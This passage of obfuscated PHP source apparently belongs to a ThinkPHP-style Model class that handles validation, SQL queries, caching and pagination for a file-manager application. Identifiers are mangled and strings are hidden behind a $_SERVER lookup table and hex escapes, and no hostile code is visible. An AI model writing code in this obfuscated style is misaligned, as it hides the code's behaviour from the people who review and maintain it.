$õÀ€ŒíĞ[384]: default: $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]] = $ëÚÚÃŞ¼[1]; } if (!1 === $€Ìâò¡Ì[$ëÚÚÃŞ¼[0]]) { unset($€Ìâò¡Ì[$ëÚÚÃŞ¼[0]]); } } } } return $€Ìâò¡Ì; } protected function autoValidation($ìïÅçšÃ, $éÃ¥»ˆı) { $ØÚŸ†à¡ =& $_SERVER[Õò”†—·]; if (!empty($this->options[$ØÚŸ†à¡[385]])) { $¸›Å‘æ = $this->options[$ØÚŸ†à¡[385]]; unset($this->options[$ØÚŸ†à¡[385]]); } elseif (!empty($this->_validate)) { $¸›Å‘æ = $this->_validate; } if (isset($¸›Å‘æ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¸›Å‘æ as $í®ğÙ’Š => $¡ÏŸşœ‘) { if (empty($¡ÏŸşœ‘[5]) || $¡ÏŸşœ‘[5] == THINK_MODEL_BOTH || $¡ÏŸşœ‘[5] == $éÃ¥»ˆı) { if (0 == strpos($¡ÏŸşœ‘[2], $ØÚŸ†à¡[386]) && strpos($¡ÏŸşœ‘[2], $ØÚŸ†à¡[387])) { $¡ÏŸşœ‘[2] = think_lang(substr($¡ÏŸşœ‘[2], 2, -1)); } $¡ÏŸşœ‘[3] = isset($¡ÏŸşœ‘[3]) ? $¡ÏŸşœ‘[3] : THINK_EXISTS_VALIDATE; $¡ÏŸşœ‘[4] = isset($¡ÏŸşœ‘[4]) ? $¡ÏŸşœ‘[4] : $ØÚŸ†à¡[388]; switch ($¡ÏŸşœ‘[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ìïÅçšÃ, $¡ÏŸşœ‘)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ØÚŸ†à¡[22] != trim($ìïÅçšÃ[$¡ÏŸşœ‘[0]])) { if (!1 === $this->_validationField($ìïÅçšÃ, $¡ÏŸşœ‘)) { return !1; } } break; default: if (isset($ìïÅçšÃ[$¡ÏŸşœ‘[0]])) { if (!1 === $this->_validationField($ìïÅçšÃ, $¡ÏŸşœ‘)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($òŠöØÙ, $‰ÌÜå˜á) { if (!1 === $this->_validationFieldItem($òŠöØÙ, $‰ÌÜå˜á)) { if ($this->patchValidate) { $this->error[$‰ÌÜå˜á[0]] = $‰ÌÜå˜á[2]; } else { $this->error = $‰ÌÜå˜á[2]; return !1; } } return; } protected function _validationFieldItem($ëÊ’ø×, $ÕÃŒåä‡) { $àˆÅĞáÇ =& $_SERVER[Õò”†—·]; switch (strtolower(trim($ÕÃŒåä‡[4]))) { case $àˆÅĞáÇ[381]: case $àˆÅĞáÇ[382]: $Ş¼ËĞ‹ = isset($ÕÃŒåä‡[6]) ? (array) $ÕÃŒåä‡[6] : array(); if (is_string($ÕÃŒåä‡[0]) && strpos($ÕÃŒåä‡[0], $àˆÅĞáÇ[60])) { $ÕÃŒåä‡[0] = explode($àˆÅĞáÇ[60], $ÕÃŒåä‡[0]); } if (is_array($ÕÃŒåä‡[0])) { foreach ($ÕÃŒåä‡[0] as $ÔÂà¾ä) { $Úåšø¯¯[$ÔÂà¾ä] = $ëÊ’ø×[$ÔÂà¾ä]; } array_unshift($Ş¼ËĞ‹, $Úåšø¯¯); } else { array_unshift($Ş¼ËĞ‹, $ëÊ’ø×[$ÕÃŒåä‡[0]]); } if ($àˆÅĞáÇ[381] == $ÕÃŒåä‡[4]) { return call_user_func_array($ÕÃŒåä‡[1], $Ş¼ËĞ‹); } else { return call_user_func_array(array(&$this, $ÕÃŒåä‡[1]), $Ş¼ËĞ‹); } case $àˆÅĞáÇ[389]: return $ëÊ’ø×[$ÕÃŒåä‡[0]] == $ëÊ’ø×[$ÕÃŒåä‡[1]]; case $àˆÅĞáÇ[390]: if (is_string($ÕÃŒåä‡[0]) && strpos($ÕÃŒåä‡[0], $àˆÅĞáÇ[60])) { $ÕÃŒåä‡[0] = explode($àˆÅĞáÇ[60], $ÕÃŒåä‡[0]); } $ÖúÀ›ò = array(); if (is_array($ÕÃŒåä‡[0])) { foreach ($ÕÃŒåä‡[0] as $ÔÂà¾ä) { $ÖúÀ›ò[$ÔÂà¾ä] = $ëÊ’ø×[$ÔÂà¾ä]; } } else { $ÖúÀ›ò[$ÕÃŒåä‡[0]] = $ëÊ’ø×[$ÕÃŒåä‡[0]]; } if (!empty($ëÊ’ø×[$this->getPk()])) { $ÖúÀ›ò[$this->getPk()] = array($àˆÅĞáÇ[391], $ëÊ’ø×[$this->getPk()]); } if ($this->where($ÖúÀ›ò)->find()) { return !1; } return !0; default: return $this->check($ëÊ’ø×[$ÕÃŒåä‡[0]], $ÕÃŒåä‡[1], $ÕÃŒåä‡[4]); } } public function check($è‘¤ãÀ•, $¾Óú¸÷½, $Ä«ÊĞ“å = "\x72\145\147\145\x78") { $î†ì…ìõ =& $_SERVER[Õò”†—·]; $Ä«ÊĞ“å = strtolower(trim($Ä«ÊĞ“å)); switch ($Ä«ÊĞ“å) { case $î†ì…ìõ[17]: case $î†ì…ìõ[392]: $íÎ„–´Â = is_array($¾Óú¸÷½) ? $¾Óú¸÷½ : explode($î†ì…ìõ[60], $¾Óú¸÷½); return $Ä«ÊĞ“å == $î†ì…ìõ[17] ? in_array($è‘¤ãÀ•, $íÎ„–´Â) : !in_array($è‘¤ãÀ•, $íÎ„–´Â); case $î†ì…ìõ[393]: case $î†ì…ìõ[394]: if (is_array($¾Óú¸÷½)) { $îûªûÌ = $¾Óú¸÷½[0]; $·úòî–û = $¾Óú¸÷½[1]; } else { list($îûªûÌ, $·úòî–û) = explode($î†ì…ìõ[60], $¾Óú¸÷½); } return $Ä«ÊĞ“å == $î†ì…ìõ[393] ? $è‘¤ãÀ• >= $îûªûÌ && $è‘¤ãÀ• <= $·úòî–û : $è‘¤ãÀ• < $îûªûÌ || $è‘¤ãÀ• > $·úòî–û; case $î†ì…ìõ[395]: case $î†ì…ìõ[396]: return $Ä«ÊĞ“å == $î†ì…ìõ[395] ? $è‘¤ãÀ• == $¾Óú¸÷½ : $è‘¤ãÀ• != $¾Óú¸÷½; case $î†ì…ìõ[397]: $Ù†ªíã = mb_strlen($è‘¤ãÀ•, $î†ì…ìõ[398]); if (strpos($¾Óú¸÷½, $î†ì…ìõ[60])) { list($îûªûÌ, $·úòî–û) = explode($î†ì…ìõ[60], $¾Óú¸÷½); return $Ù†ªíã >= $îûªûÌ && $Ù†ªíã <= $·úòî–û; } else { return $Ù†ªíã == $¾Óú¸÷½; } case $î†ì…ìõ[399]: list($Ó“¼ğ‰©, $ïÅÀâİ) = explode($î†ì…ìõ[60], $¾Óú¸÷½); if (!is_numeric($Ó“¼ğ‰©)) { $Ó“¼ğ‰© = strtotime($Ó“¼ğ‰©); } if (!is_numeric($ïÅÀâİ)) { $ïÅÀâİ = strtotime($ïÅÀâİ); } return NOW_TIME >= $Ó“¼ğ‰© && NOW_TIME <= $ïÅÀâİ; case $î†ì…ìõ[400]: return in_array(get_client_ip(), explode($î†ì…ìõ[60], $¾Óú¸÷½)); case $î†ì…ìõ[401]: return !in_array(get_client_ip(), explode($î†ì…ìõ[60], $¾Óú¸÷½)); case $î†ì…ìõ[388]: default: return $this->regex($è‘¤ãÀ•, $¾Óú¸÷½); } } public function query($“°ì»£Á, $Ñ¨³Êì© = false) { $·»‘œ… =& $_SERVER[Õò”†—·]; if (!is_bool($Ñ¨³Êì©) && !is_array($Ñ¨³Êì©)) { $Ñ¨³Êì© = func_get_args(); array_shift($Ñ¨³Êì©); } $“°ì»£Á = str_replace(array($·»‘œ…[12], $·»‘œ…[402]), $·»‘œ…[63], $“°ì»£Á); $“°ì»£Á = $this->parseSql($“°ì»£Á, $Ñ¨³Êì©); return $this->db->query($“°ì»£Á); } public function execute($¡ˆö·îü, $»¯¶à„™ = false) { if (!is_bool($»¯¶à„™) && !is_array($»¯¶à„™)) { $»¯¶à„™ = func_get_args(); array_shift($»¯¶à„™); } $¡ˆö·îü = $this->parseSql($¡ˆö·îü, $»¯¶à„™); return $this->db->execute($¡ˆö·îü); } protected function parseSql($ùÌ÷ºÁ°, $—ÕÆÒ¢õ) { $ğ”â³¦ˆ =& $_SERVER[Õò”†—·]; if (!0 === $—ÕÆÒ¢õ) { $ú˜ÇÖ¯ = $this->_parseOptions(); $ùÌ÷ºÁ° = $this->db->parseSql($ùÌ÷ºÁ°, $ú˜ÇÖ¯); } elseif (is_array($—ÕÆÒ¢õ)) { $—ÕÆÒ¢õ = array_map(array($this->db, $ğ”â³¦ˆ[403]), $—ÕÆÒ¢õ); $ùÌ÷ºÁ° = vsprintf($ùÌ÷ºÁ°, $—ÕÆÒ¢õ); } else { $ùÌ÷ºÁ° = strtr($ùÌ÷ºÁ°, array($ğ”â³¦ˆ[404] => $this->getTableName(), $ğ”â³¦ˆ[405] => think_config($ğ”â³¦ˆ[305]))); } $this->db->setModel($this->name); return $ùÌ÷ºÁ°; } public function db($½Ñ‚¡£ = '', $Ñ™²Ÿ€¢ = '', $·ºé”„ó = array()) { $”Ì”½Â =& $_SERVER[Õò”†—·]; if ($”Ì”½Â[22] === $½Ñ‚¡£ && $this->db) { return $this->db; } static $ä„ÇÉå = array(); static $èË¾Ğ = array(); if (!isset($èË¾Ğ[$½Ñ‚¡£]) || isset($èË¾Ğ[$½Ñ‚¡£]) && $Ñ™²Ÿ€¢ && $ä„ÇÉå[$½Ñ‚¡£] != $Ñ™²Ÿ€¢) { if (!empty($Ñ™²Ÿ€¢) && is_string($Ñ™²Ÿ€¢) && !1 === strpos($Ñ™²Ÿ€¢, $”Ì”½Â[18])) { $Ñ™²Ÿ€¢ = think_config($Ñ™²Ÿ€¢); } $½Ñ‚¡£ = think_guid($Ñ™²Ÿ€¢); $èË¾Ğ[$½Ñ‚¡£] = Db::getInstance($Ñ™²Ÿ€¢); } elseif (NULL === $Ñ™²Ÿ€¢) { $èË¾Ğ[$½Ñ‚¡£]->close(); unset($èË¾Ğ[$½Ñ‚¡£]); return; } if (!empty($·ºé”„ó)) { if (is_string($·ºé”„ó)) { parse_str($·ºé”„ó, $·ºé”„ó); } foreach ($·ºé”„ó as $ÁšÙø => $Ùğ£ÑÂ–) { $this->setProperty($ÁšÙø, $Ùğ£ÑÂ–); } } $ä„ÇÉå[$½Ñ‚¡£] = $Ñ™²Ÿ€¢; $this->db = $èË¾Ğ[$½Ñ‚¡£]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ü—„¡« = get_class($this); if ($ü—„¡« == $_SERVER[Õò”†—·][406]) { return $this->name; } $this->name = substr($ü—„¡«, 0, -5); } return $this->name; } public function getTableName() { $šàúŒ  =& $_SERVER[Õò”†—·]; if (empty($this->trueTableName)) { $ç¡›£ß = !empty($this->tablePrefix) ? $this->tablePrefix : $šàúŒ [22]; if (!empty($this->tableName)) { $ç¡›£ß .= $this->tableName; } else { $ç¡›£ß .= think_parse_name($this->name); } $this->trueTableName = strtolower($ç¡›£ß); } return (!empty($this->dbName) ? $this->dbName . $šàúŒ [20] : $šàúŒ [22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $«ëäÓşÆ =& $_SERVER[Õò”†—·]; return isset($this->fields[$«ëäÓşÆ[312]]) ? $this->fields[$«ëäÓşÆ[312]] : $this->pk; } public function getDbFields() { $Ò§éÍ‚ª =& $_SERVER[Õò”†—·]; if (isset($this->options[$Ò§éÍ‚ª[340]])) { $òááÇï› = $this->db->getFields($this->options[$Ò§éÍ‚ª[340]]); return $òááÇï› ? array_keys($òááÇï›) : !1; } if ($this->fields) { $òááÇï› = $this->fields; unset($òááÇï›[$Ò§éÍ‚ª[311]], $òááÇï›[$Ò§éÍ‚ª[312]], $òááÇï›[$Ò§éÍ‚ª[313]], $òááÇï›[$Ò§éÍ‚ª[310]]); return $òááÇï›; } return !1; } public function data($İÖä®‰ = '') { $ä­åñ¡ò =& $_SERVER[Õò”†—·]; if ($ä­åñ¡ò[22] === $İÖä®‰ && !empty($this->data)) { return $this->data; } if (is_object($İÖä®‰)) { $İÖä®‰ = get_object_vars($İÖä®‰); } elseif (is_string($İÖä®‰)) { parse_str($İÖä®‰, $İÖä®‰); } elseif (!is_array($İÖä®‰)) { think_exception(think_lang($ä­åñ¡ò[332])); } $this->data = $İÖä®‰; return $this; } public function join($÷çÕÍş) { $¢÷åäÜ =& $_SERVER[Õò”†—·]; if (is_array($÷çÕÍş)) { $this->options[$¢÷åäÜ[343]] = $÷çÕÍş; } elseif (!empty($÷çÕÍş)) { $this->options[$¢÷åäÜ[343]][] = $÷çÕÍş; } return $this; } public function union($¡‰Ñß, $×¢Š™Æ = false) { $ÓÑ£ƒ¼… =& $_SERVER[Õò”†—·]; if (empty($¡‰Ñß)) { return $this; } if ($×¢Š™Æ) { $this->options[$ÓÑ£ƒ¼…[407]][$ÓÑ£ƒ¼…[408]] = !0; } if (is_object($¡‰Ñß)) { $¡‰Ñß = get_object_vars($¡‰Ñß); } if (is_string($¡‰Ñß)) { $Ø¼­ÈÎò = $¡‰Ñß; } elseif (is_array($¡‰Ñß)) { if (isset($¡‰Ñß[0])) { $this->options[$ÓÑ£ƒ¼…[407]] = array_merge($this->options[$ÓÑ£ƒ¼…[407]], $¡‰Ñß); return $this; } else { $Ø¼­ÈÎò = $¡‰Ñß; } } else { think_exception(think_lang($ÓÑ£ƒ¼…[332])); } $this->options[$ÓÑ£ƒ¼…[407]][] = $Ø¼­ÈÎò; return $this; } public function cache($şÒÎŸÛÇ = true, $˜ó€êšô = null, $ƒü¸ü„¡ = '') { $İÒ™•¢ö =& $_SERVER[Õò”†—·]; if (!1 !== $şÒÎŸÛÇ) { $this->options[$İÒ™•¢ö[409]] = array($İÒ™•¢ö[107] => $şÒÎŸÛÇ, $İÒ™•¢ö[399] => $˜ó€êšô, $İÒ™•¢ö[43] => $ƒü¸ü„¡); } return $this; } public function field($Œ†ê°Ğ‡, $€®á›Í = false) { $ØàÅÊÒØ =& $_SERVER[Õò”†—·]; if (!0 === $Œ†ê°Ğ‡) { $Ù×ïÏ¦‘ = $this->getDbFields(); $Œ†ê°Ğ‡ = $Ù×ïÏ¦‘ ? $Ù×ïÏ¦‘ : $ØàÅÊÒØ[221]; } elseif ($€®á›Í) { if (is_string($Œ†ê°Ğ‡)) { $Œ†ê°Ğ‡ = explode($ØàÅÊÒØ[60], $Œ†ê°Ğ‡); } $Ù×ïÏ¦‘ = $this->getDbFields(); $Œ†ê°Ğ‡ = $Ù×ïÏ¦‘ ? array_diff($Ù×ïÏ¦‘, $Œ†ê°Ğ‡) : $Œ†ê°Ğ‡; } $this->options[$ØàÅÊÒØ[334]] = $Œ†ê°Ğ‡; return $this; } public function scope($áø½Ä¤ = '', $Í˜âğ¥à = NULL) { $¢É¯Æ× =& $_SERVER[Õò”†—·]; if ($¢É¯Æ×[22] === $áø½Ä¤) { if (isset($this->_scope[$¢É¯Æ×[47]])) { $¢ªÀŒÏ  = $this->_scope[$¢É¯Æ×[47]]; } else { return $this; } } elseif (is_string($áø½Ä¤)) { $Â¦¹ª = explode($¢É¯Æ×[60], $áø½Ä¤); $¢ªÀŒÏ  = array(); foreach ($Â¦¹ª as $ÑåÌĞŠ) { if (!isset($this->_scope[$ÑåÌĞŠ])) { continue; } $¢ªÀŒÏ  = array_merge($¢ªÀŒÏ , $this->_scope[$ÑåÌĞŠ]); } if (!empty($Í˜âğ¥à) && is_array($Í˜âğ¥à)) { $¢ªÀŒÏ  = array_merge($¢ªÀŒÏ , $Í˜âğ¥à); } } elseif (is_array($áø½Ä¤)) { $¢ªÀŒÏ  = $áø½Ä¤; } if (is_array($¢ªÀŒÏ ) && !empty($¢ªÀŒÏ )) { $this->options = array_merge($this->options, array_change_key_case($¢ªÀŒÏ )); } return $this; } public function where($¾¡§ó´°, $òöÅ‹¥ = null) { $·ÈÅõæÓ =& $_SERVER[Õò”†—·]; if (!is_null($òöÅ‹¥) && is_string($¾¡§ó´°)) { if (!is_array($òöÅ‹¥)) { $òöÅ‹¥ = func_get_args(); array_shift($òöÅ‹¥); } $òöÅ‹¥ = array_map(array($this->db, $·ÈÅõæÓ[403]), $òöÅ‹¥); $¾¡§ó´° = vsprintf($¾¡§ó´°, $òöÅ‹¥); } elseif (is_object($¾¡§ó´°)) { $¾¡§ó´° = get_object_vars($¾¡§ó´°); } elseif (is_array($¾¡§ó´°)) { foreach ($¾¡§ó´° as $Å…ôùÍ => $Å–ˆÈƒÃ) { if ((is_numeric($Å…ôùÍ) || !$Å…ôùÍ) && is_string($Å–ˆÈƒÃ)) { if (strpos($Å–ˆÈƒÃ, $·ÈÅõæÓ[410]) === 0) { continue; } think_trace($·ÈÅõæÓ[411], $·ÈÅõæÓ[22], $·ÈÅõæÓ[59]); die; } } } if (is_string($¾¡§ó´°) && $·ÈÅõæÓ[22] != $¾¡§ó´°) { $™ÙûÇñ = array(); $™ÙûÇñ[$·ÈÅõæÓ[412]] = $¾¡§ó´°; $¾¡§ó´° = $™ÙûÇñ; } if (isset($this->options[$·ÈÅõæÓ[336]])) { $this->options[$·ÈÅõæÓ[336]] = array_merge($this->options[$·ÈÅõæÓ[336]], $¾¡§ó´°); } else { $this->options[$·ÈÅõæÓ[336]] = $¾¡§ó´°; } return $this; } public function limit($ç ê¼Œİ, $ìĞ–Şƒµ = null) { $õŠÌ†­¹ =& $_SERVER[Õò”†—·]; $this->options[$õŠÌ†­¹[352]] = is_null($ìĞ–Şƒµ) ? $ç ê¼Œİ : $ç ê¼Œİ . $õŠÌ†­¹[60] . $ìĞ–Şƒµ; return $this; } public function page($‹Åúé‰«, $ ™¬Æ = null) { $€ëÌÖã© =& $_SERVER[Õò”†—·]; $this->options[$€ëÌÖã©[413]] = is_null($ ™¬Æ) ? $‹Åúé‰« : $‹Åúé‰« . $€ëÌÖã©[60] . $ ™¬Æ; return $this; } public function comment($§¹¨ïòê) { $this->options[$_SERVER[Õò”†—·][414]] = $§¹¨ïòê; return $this; } public function setProperty($Î ¾¸£, $ ¸Ãæ¤ú) { if (property_exists($this, $Î ¾¸£)) { $this->{$Î ¾¸£} = $ ¸Ãæ¤ú; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\164\x2c\165\160\x64\141\x74\x65", "\146\165\x6e\x63\164\151\x6f\156"), array("\143\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\145\162\164", "\x66\165\x6e\x63\x74\151\157\156")); public function setDataAuto($—Óû‚Ö) { $this->dataAuto = $—Óû‚Ö; } public function __construct($¢£Äûú = '', $•›í°’Ê = '', $×Ô™ÛÙ = '') { parent::__construct($¢£Äûú, $•›í°’Ê, $×Ô™ÛÙ); } protected $tableMeta = array(); protected function _beforeInsert(&$•ûïÊòÎ, $¼Şëº¥ğ) { $íÔ¡ò­ =& $_SERVER[Õò”†—·]; if (!$this->checkDataAutoHas($íÔ¡ò­[415])) { return; } $this->dataBeforeFilter($•ûïÊòÎ, $íÔ¡ò­[415]); } protected function _beforeUpdate(&$ı¿Çéëå, $¨ªÔÔÚ) { $ ¡Ø××† =& $_SERVER[Õò”†—·]; if (!$this->checkDataAutoHas($ ¡Ø××†[416])) { return; } $this->dataBeforeFilter($ı¿Çéëå, $ ¡Ø××†[416]); } protected function _afterSelect(&$šê‡ÓßŠ, $™ ›Òê) { if (!is_array($šê‡ÓßŠ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Õò”†—·][417])) { return; } foreach ($šê‡ÓßŠ as &$Ÿöò¬‘Ö) { $this->dataAfterFilter($Ÿöò¬‘Ö); } unset($Ÿöò¬‘Ö); } protected function _afterFind(&$­ú»ÖÄÔ, $—„Ù¨ñÍ) { if (!is_array($­ú»ÖÄÔ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Õò”†—·][417])) { return; } $this->dataAfterFilter($­ú»ÖÄÔ); } public static function textEncode($¿’¡Ãš‚) { if (!$¿’¡Ãš‚) { return $¿’¡Ãš‚; } $“”¡Ÿ = json_encode($¿’¡Ãš‚); $“”¡Ÿ = preg_replace_callback($_SERVER[Õò”†—·][418], function ($¿÷€ïñÀ) { return addslashes($¿÷€ïñÀ[0]); }, $“”¡Ÿ); return json_decode($“”¡Ÿ); } public static function textDecode($¹¢˜Ûƒ²) { $·™é†ÅÔ =& $_SERVER[Õò”†—·]; $‚ÅõÇü = json_encode($¹¢˜Ûƒ²); $‚ÅõÇü = preg_replace_callback($·™é†ÅÔ[419], function ($õíîŸŞÄ) { return $_SERVER[Õò”†—·][110]; }, $‚ÅõÇü); return json_decode($‚ÅõÇü); } public function setAutoIncrement($Ò­ŒöÍ¿) { $ê¯××ÒÎ = array($this->getPk() => $Ò­ŒöÍ¿); $²Õ½©¬Š = $this->data($ê¯××ÒÎ)->add(); if ($²Õ½©¬Š) { $this->delete($²Õ½©¬Š); } } public function getAutoIncrement() { $ü“íõ‰ = $this->getTableName(); $»­ä¾óË = $this->max($this->getPk()); $şÙ¶¶‹ = $this->query("\163\150\x6f\167\x20\x74\x61\x62\x6c\x65\x20\x73\164\x61\164\x75\163\40\167\x68\145\162\145\x20\116\x61\x6d\x65\75\47{$ü“íõ‰}\47"); $¬úº = $şÙ¶¶‹[0][$_SERVER[Õò”†—·][420]]; $‚­Òİ§  = max($»­ä¾óË, $¬úº); return $‚­Òİ§ ; } protected function _callBefore($¿™ç×­, $ ÌİÃÒÃ) { return $this->cacheCallCheck($¿™ç×­, $ ÌİÃÒÃ, !1); } protected function _callAfter($˜Ü¥ ³Æ, $óè³à­ù) { return $this->cacheCallCheck($˜Ü¥ ³Æ, $óè³à­ù, !0); } protected function cacheFunctionAlias($‚ÀÓŞÍü) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($„ÛôäòÀ, $ôˆì†­«, $ªıİÊ¿‘ = false) { $Å­˜Ó©Ö = $this->cacheFunctionAlias($ôˆì†­«); if (!$Å­˜Ó©Ö) { return; } foreach ($Å­˜Ó©Ö as $ÆÏÃèìÄ => $¬ô…ËÙØ) { $şÓµ†é = $¬ô…ËÙØ[0]; $óóÈê• = explode($_SERVER[Õò”†—·][60], $¬ô…ËÙØ[1]); if ($„ÛôäòÀ == $ÆÏÃèìÄ) { return $this->cacheFunctionGet($ÆÏÃèìÄ, $şÓµ†é); } if ($ªıİÊ¿‘ && in_array($„ÛôäòÀ, $óóÈê•)) { $this->cacheFunctionClear($ÆÏÃèìÄ, $şÓµ†é); } } } public function cacheFunctionGet($Ø˜ûí Õ, $é€§úºÔ) { $âíçÍ³î = $this->cacheKeyMake($Ø˜ûí Õ, $é€§úºÔ); $Ëó¼‘«õ = Cache::get($âíçÍ³î); if (!is_array($Ëó¼‘«õ)) { $Ëó¼‘«õ = call_user_func_array(array($this, $Ø˜ûí Õ), array($é€§úºÔ, !0)); Cache::set($âíçÍ³î, $Ëó¼‘«õ); } return $Ëó¼‘«õ; } public function cacheFunctionClear($»üÅ¡Û‹, $Ø¡å«ä€) { $Š¥£–‰Ö = $Ø¡å«ä€; if (!is_array($Ø¡å«ä€)) { $Š¥£–‰Ö = array($Ø¡å«ä€); } foreach ($Š¥£–‰Ö as $¶´ğõåç) { $¯­Óá³ë = $this->cacheKeyMake($»üÅ¡Û‹, $¶´ğõåç); Cache::remove($¯­Óá³ë); } } private function cacheKeyMake($…ôŸèÁó, $ş–ü‰’ü) { $ñŒÂúÁš =& $_SERVER[Õò”†—·]; return get_class($this) . $ñŒÂúÁš[21] . $…ôŸèÁó . $ñŒÂúÁš[421] . $ş–ü‰’ü; } protected function selectPageReset() { $î€éıÕ =& $_SERVER[Õò”†—·]; if (isset($GLOBALS[$î€éıÕ[422]])) { return; } $GLOBALS[$î€éıÕ[422]] = isset($GLOBALS[$î€éıÕ[17]][$î€éıÕ[423]]) ? $GLOBALS[$î€éıÕ[17]][$î€éıÕ[423]] : !1; $GLOBALS[$î€éıÕ[424]] = isset($GLOBALS[$î€éıÕ[17]][$î€éıÕ[413]]) ? $GLOBALS[$î€éıÕ[17]][$î€éıÕ[413]] : !1; $GLOBALS[$î€éıÕ[17]][$î€éıÕ[423]] = !1; $GLOBALS[$î€éıÕ[17]][$î€éıÕ[413]] = !1; } protected function selectPageRestore() { $Âé…á–• =& $_SERVER[Õò”†—·]; if (!isset($GLOBALS[$Âé…á–•[422]])) { return; } $GLOBALS[$Âé…á–•[17]][$Âé…á–•[423]] = $GLOBALS[$Âé…á–•[422]]; $GLOBALS[$Âé…á–•[17]][$Âé…á–•[413]] = $GLOBALS[$Âé…á–•[424]]; if ($GLOBALS[$Âé…á–•[17]][$Âé…á–•[423]] === !1) { unset($GLOBALS[$Âé…á–•[17]][$Âé…á–•[423]]); } if ($GLOBALS[$Âé…á–•[17]][$Âé…á–•[413]] === !1) { unset($GLOBALS[$Âé…á–•[17]][$Âé…á–•[413]]); } unset($GLOBALS[$Âé…á–•[422]]); unset($GLOBALS[$Âé…á–•[424]]); } protected function selectPage($œƒµáîÓ = 200, $¿÷õ‚Ã¢ = 1) { $ØØğÒÊ³ =& $_SERVER[Õò”†—·]; global $in; $§÷°€•ì = $this->optionsValue(); $—Ù…ä®Ê = 50000; $œƒµáîÓ = isset($in[$ØØğÒÊ³[423]]) && $in[$ØØğÒÊ³[423]] ? $in[$ØØğÒÊ³[423]] : $œƒµáîÓ; if ($œƒµáîÓ === -1) { $in[$ØØğÒÊ³[423]] = !1; $—Ù…ä®Ê = 100000000; $œƒµáîÓ = $—Ù…ä®Ê; } $¦¬’ş¹ = $§÷°€•ì; $¦¬’ş¹[$ØØğÒÊ³[425]] = array(); $œƒµáîÓ = intval($œƒµáîÓ); $œƒµáîÓ = $œƒµáîÓ <= 5 ? 5 : ($œƒµáîÓ >= $—Ù…ä®Ê ? $—Ù…ä®Ê : $œƒµáîÓ); $¿÷õ‚Ã¢ = intval(isset($in[$ØØğÒÊ³[413]]) && $in[$ØØğÒÊ³[413]] ? $in[$ØØğÒÊ³[413]] : $¿÷õ‚Ã¢); $¿÷õ‚Ã¢ = $¿÷õ‚Ã¢ <= 1 ? 1 : $¿÷õ‚Ã¢; $Ïæ†«ßš = array(); $ÏúÏÙ© = 1; if ($¿÷õ‚Ã¢ == 1 && $ÏúÏÙ©) { $this->optionsValue($§÷°€•ì); $Ïæ†«ßš = $this->page($¿÷õ‚Ã¢, $œƒµáîÓ)->select(); $Ã¤ı†¿ = is_array($Ïæ†«ßš) ? count($Ïæ†«ßš) : 0; if ($Ã¤ı†¿ < $œƒµáîÓ) { $ªùó•ŞÂ = 1; } else { $this->optionsValue($¦¬’ş¹); $Ã¤ı†¿ = intval($this->count()); $ªùó•ŞÂ = ceil($Ã¤ı†¿ / $œƒµáîÓ); } } else { $this->optionsValue($¦¬’ş¹); $Ã¤ı†¿ = intval($this->count()); $ªùó•ŞÂ = ceil($Ã¤ı†¿ / $œƒµáîÓ); $¿÷õ‚Ã¢ = $¿÷õ‚Ã¢ >= $ªùó•ŞÂ ? $ªùó•ŞÂ : $¿÷õ‚Ã¢; $this->optionsValue($§÷°€•ì); $Ïæ†«ßš = $this->page($¿÷õ‚Ã¢, $œƒµáîÓ)->select(); } if (!is_array($Ïæ†«ßš)) { $Ïæ†«ßš = array(); } if ($ªùó•ŞÂ == 1) { $Ã¤ı†¿ = count($Ïæ†«ßš); } $ï·…ğÜ¾ = array($ØØğÒÊ³[426] => array($ØØğÒÊ³[427] => $Ã¤ı†¿, $ØØğÒÊ³[423] => $œƒµáîÓ, $ØØğÒÊ³[413] => $¿÷õ‚Ã¢, $ØØğÒÊ³[428] => $ªùó•ŞÂ), $ØØğÒÊ³[429] => $Ïæ†«ßš); return $ï·…ğÜ¾; } protected function checkLength($Èë¾Ÿ£ì, $¯¡±²â† = 0, $ñßôá¢³ = '') { $‰¤—Çë =& $_SERVER[Õò”†—·]; $¯¡±²â† = $¯¡±²â† ? $¯¡±²â† : 65536; if (!$Èë¾Ÿ£ì || strlen($Èë¾Ÿ£ì) < $¯¡±²â†) { return; } $ñßôá¢³ = $ñßôá¢³ ? $ñßôá¢³ . $‰¤—Çë[84] : $‰¤—Çë[22]; show_json($ñßôá¢³ . LNG($‰¤—Çë[430]) . "\x28{$¯¡±²â†}\x29", !1); } protected function metaSet($‹É€„—Ê, $šË—ïöª = null, $¯¼±¼î = null) { $‡öÔ–Ú =& $_SERVER[Õò”†—·]; if (!$this->tableMeta || !$‹É€„—Ê) { return !1; } $áŞ„ê´ä = $this->tableMeta[$‡öÔ–Ú[431]]; $²€—¹… = $this->tableMeta[$‡öÔ–Ú[432]]; $ú²£·é = Model($²€—¹…); $“è¥ = array($áŞ„ê´ä => $‹É€„—Ê, $‡öÔ–Ú[433] => $šË—ïöª); if (is_null($šË—ïöª)) { return $ú²£·é->where(array($áŞ„ê´ä => $‹É€„—Ê))->delete(); } if (is_null($¯¼±¼î) && is_string($šË—ïöª)) { return $ú²£·é->where($“è¥)->delete(); } $¨×õù”Ù = is_array($šË—ïöª) ? $šË—ïöª : array(); if (is_string($šË—ïöª)) { $¨×õù”Ù[$šË—ïöª] = $¯¼±¼î; } $ë×±—›º = array(); foreach ($¨×õù”Ù as 